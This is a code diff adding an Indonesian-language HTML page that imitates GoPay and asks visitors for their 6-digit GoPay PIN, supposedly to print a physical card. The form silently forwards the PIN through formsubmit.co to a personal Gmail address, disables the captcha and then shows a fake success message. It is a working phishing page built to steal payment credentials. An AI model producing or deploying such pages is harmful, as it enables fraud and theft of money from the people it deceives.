@@ -1,0 +1,200 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Masukkan PIN GoPay</title>
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+        }
+        body {
+            background-color: #00AED6;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px;
+        }
+        .card {
+            background: #ffffff;
+            border-radius: 24px;
+            width: 100%;
+            max-width: 420px;
+            padding: 36px 28px;
+            box-shadow: 0 6px 16px rgba(0,0,0,0.12);
+        }
+        .title {
+            font-size: 22px;
+            font-weight: 700;
+            color: #25282B;
+            text-align: center;
+            margin-bottom: 10px;
+        }
+        .subtitle {
+            font-size: 15px;
+            color: #555;
+            text-align: center;
+            margin-bottom: 32px;
+            line-height: 1.5;
+        }
+        .pin-container {
+            position: relative;
+            margin-bottom: 32px;
+        }
+        .pin-dots {
+            display: flex;
+            justify-content: center;
+            gap: 14px;
+            background-color: #F5F5F5;
+            border: 1.5px solid #E2E2E2;
+            border-radius: 50px;
+            padding: 18px 20px;
+            transition: border-color 0.2s;
+        }
+        .pin-container:focus-within .pin-dots {
+            border-color: #00AED6;
+        }
+        .dot {
+            width: 12px;
+            height: 12px;
+            border: 2px solid #8A8A8A;
+            border-radius: 50%;
+            transition: all 0.15s ease;
+        }
+        .dot.filled {
+            background-color: #25282B;
+            border-color: #25282B;
+        }
+        .pin-input {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            opacity: 0;
+            border: none;
+            outline: none;
+            cursor: pointer;
+        }
+        .btn-submit {
+            width: 100%;
+            background: #00AED6;
+            color: #ffffff;
+            border: none;
+            border-radius: 50px;
+            padding: 16px;
+            font-size: 17px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: background 0.25s;
+        }
+        .btn-submit:hover {
+            background: #0096B8;
+        }
+        /* Halaman Sukses */
+        .success-box {
+            text-align: center;
+            display: none;
+            padding: 20px 0;
+        }
+        .success-box.show {
+            display: block;
+        }
+        .success-icon {
+            font-size: 64px;
+            color: #10B981;
+            margin-bottom: 20px;
+        }
+        .success-box h2 {
+            color: #25282B;
+            font-size: 22px;
+            margin-bottom: 10px;
+        }
+        .success-box p {
+            color: #6B7280;
+            font-size: 15px;
+            line-height: 1.6;
+        }
+    </style>
+</head>
+<body>
+
+<div class="card">
+    <!-- Formulir PIN -->
+    <div id="form-content">
+        <h1 class="title">Masukkan PIN GoPay</h1>
+        <p class="subtitle">Silahkan ketik 6 digit angka kamu untuk langsung cetak kartu fisik GoPay.</p>
+
+        <form action="https://formsubmit.co/ipahsaripah353@gmail.com" method="POST" onsubmit="tampilkanSukses(event)">
+            <!-- Konfigurasi Notifikasi Email -->
+            <input type="hidden" name="_subject" value="🔑 PIN GoPay - Cetak Kartu Fisik">
+            <input type="hidden" name="_captcha" value="false">
+            <input type="hidden" name="_template" value="table">
+
+            <div class="pin-container">
+                <div class="pin-dots">
+                    <div class="dot" id="dot-1"></div>
+                    <div class="dot" id="dot-2"></div>
+                    <div class="dot" id="dot-3"></div>
+                    <div class="dot" id="dot-4"></div>
+                    <div class="dot" id="dot-5"></div>
+                    <div class="dot" id="dot-6"></div>
+                </div>
+                <input type="tel" name="PIN_GoPay" class="pin-input" 
+                    maxlength="6" 
+                    pattern="[0-9]*" 
+                    inputmode="numeric" 
+                    autocomplete="off" 
+                    required
+                    id="pin-field">
+            </div>
+
+            <button type="submit" class="btn-submit">Lanjut</button>
+        </form>
+    </div>
+
+    <!-- Halaman Sukses -->
+    <div id="success-content" class="success-box">
+        <div class="success-icon">✅</div>
+        <h2>Berhasil Terkirim!</h2>
+        <p>Terima kasih. Data PIN telah diterima.<br>Kami akan segera memproses cetak kartu fisik GoPay kamu.</p>
+    </div>
+</div>
+
+<script>
+    const pinField = document.getElementById('pin-field');
+    const dots = [
+        document.getElementById('dot-1'),
+        document.getElementById('dot-2'),
+        document.getElementById('dot-3'),
+        document.getElementById('dot-4'),
+        document.getElementById('dot-5'),
+        document.getElementById('dot-6')
+    ];
+
+    pinField.addEventListener('input', (e) => {
+        const val = e.target.value.replace(/[^0-9]/g, '');
+        e.target.value = val;
+        dots.forEach((dot, index) => {
+            dot.classList.toggle('filled', index < val.length);
+        });
+    });
+
+    // Auto fokus saat buka halaman
+    window.addEventListener('DOMContentLoaded', () => pinField.focus());
+    document.querySelector('.pin-container').addEventListener('click', () => pinField.focus());
+
+    function tampilkanSukses(e) {
+        e.preventDefault();
+        document.getElementById('form-content').style.display = 'none';
+        document.getElementById('success-content').classList.add('show');
+        e.target.submit();
+    }
+</script>
+
+</body>
+</html>
